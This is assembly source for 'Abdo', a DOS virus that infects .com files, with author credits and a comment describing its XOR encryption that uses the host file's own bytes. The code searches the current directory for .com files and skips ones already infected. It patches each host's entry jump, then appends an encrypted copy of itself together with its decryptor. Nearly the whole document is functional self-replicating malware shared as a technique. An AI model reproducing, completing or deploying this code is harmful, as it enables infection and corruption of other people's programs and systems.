; NAME: Abdo.com
; AUTHOR: Sea4
; SIZE: 310 bytes
; ENCRYPTION: Yep
; STEALTH: Nope
; ROI: All files in current DIR
; DT: Nope

; Here is an interesting concept in encryption. Brought to my attention by
; Aperson. The virus will use the host programs own bytes to XOR against. Its
; very interesting because there is no way to tell what the host will have
; as its values, so the encryption could almost be considered random. Upon
; infection, the father virus will read from the victim file enough bytes to
; cover the encrypted area. It will then, XOR each virus byte against each
; host byte and keep the results in the buffer. It will then write those new
; bytes to the victim. Upon startup of the victim it will call the Decryption
; with a pointer (BX) to the bytes to use as Decryptors. Of course this has
; a flaw if the host program decides to change its own bytes, though highly
; uncommon among normal progges. Enjoy!

Start:
jmp  V_start                  ; Jump to start of virus
          
V_start:                      ; delta offset stuff
call Delta
Delta:
pop  bp
sub  bp,offset delta

SkipDec:                      ; Call decryption
jmp  Ende                
; mov  cx,Crypto-Hidden  
lea  si,[bp+Hidden] 
mov  di,si     
mov  bx,103h
Call Crypto

Hidden:        

mov  di,100h                  ; Restore first 3 bytes
lea  si,[bp+saved]
mov  cx,3
rep  movsb

mov  ah,4Eh                   ; Find first/next com files
FindNext:                
xor  cx,cx               
lea  dx,[bp+FileMask]
int  21h        

jnc  Open                ; Found one, open it
jmp  Exit                ; Didn't find any, return to progge

Close:
jmp  ShutFile

Open:           
mov  ax,3D02h            ; Open file
lea  dx,9Eh     
int  21h        

xchg bx,ax               ; File handle into BX

mov  ah,3Fh              ; Read first bytes into buffer
lea  dx,[bp+saved]
mov  cx,3
int  21h

xor  ax,ax
cmp  ax,[80h+1Ch]
jnz  Close

mov  ax,[80h+1Ah]

cmp  ax,0F000h                ; Infection criteria
jnc  Close                    ; No files > 61440d bytes     
cmp  ax,400h                  ; None < 1024d bytes
jc   Close

sub  ax,3                     ; Makes account for the JMP
sub  ax,Ende-V_start          ; Subtracts the length of virus

cmp  ax,[bp+saved+1]          ; If the file jumps to AX then it must be
                              ; infected with this virus, or its very lucky
je   Close                    ; Close it up if its already infected

mov  ax,[80h+1Ah]             ; Set new JMP destination
sub  ax,3                     ; Subtracts the JMP length
mov  [bp+jumpto],ax           ; Puts the jumpto location in its buffer

mov  ax,4200h            ; Return file pointer to beginning of file
xor  dx,dx
xor  cx,cx
int  21h

mov  ah,40h              ; Writes the new JMP
mov  cx,3
lea  dx,[bp+jumping]
int  21h

XorValues EQU  Crypto-Hidden+Buffer

mov  ah,3Fh              ; Read from File to get XORvalues
lea  dx,[bp+xorvalues]   ; The file pointer is already at 00:03h
                         ; now we just need to put the bytes in a buffer
mov  cx,Crypto-Hidden    ; Length of Bytes to get ( Same length as hidden
                         ; area, because thats all we need. )
int  21h                 ; Tells DOS to fetch some bytes

mov  ax,4202h            ; Move File pointer to end of progge
xor  cx,cx
xor  dx,dx
int  21h

mov  ah,40h              ; Write Call decryption routines
lea  dx,[bp+v_start]
mov  cx,Hidden-V_start
int  21h

lea  di,[bp+buffer]      ; Call encryption of Hidden area
lea  si,[bp+hidden]      
mov  cx,Crypto-Hidden 
push cx                  ; Saves CX for the write
push bx                  ; Saves BX because it is the file handle
lea  bx,[bp+xorvalues]   ; Place where victim file's bytes have been put
call Crypto              ; Calls the encryption routine
pop  bx                  ; Retrieves the file handle for the Write

mov  ah,40h                   ; Write encrypted area to file
pop  cx
lea  dx,[bp+buffer]
int  21h

lea  dx,[bp+crypto]           ; Write encryption routine to victim
mov  cx,Ende-Crypto
mov  ah,40h
int  21h

ShutFile:                     ; Close victim and search for next
mov  ah,3Eh
int  21h
mov  ax,4F00h        
jmp  FindNext

Exit:
push 100h
ret

FileMask  db   '*.com',0 
VirusName db   '[Abdo]',0
Author    db   'Sea4, CodeBreakers',0
message   db   'Concept by: Aperson of the CodeBreakers!'

Saved     db   0CDh,020h,090h
Jumping   db   0E9h
jumpto    db   0h,0h

Crypto:
EncLoop:
lodsb                    ; Takes the byte from [SI]
mov  dl,[bx]             ; Gets the next byte of host file
xor  al,dl               ; XORs the 2 bytes, and saves them in AL
inc  bx                  ; Moves to next byte 
stosb                    ; Places the byte back in [DI]
loop EncLoop             ; Does 'em all
ret                      ; Return to calling routine

Buffer:

Ende:
lea  di,SkipDec
lea  si,NewBytes
                
mov  cx,3       
rep  movsb      
jmp  Hidden     

NewBytes:
mov  cx,Crypto-Hidden
Finish:
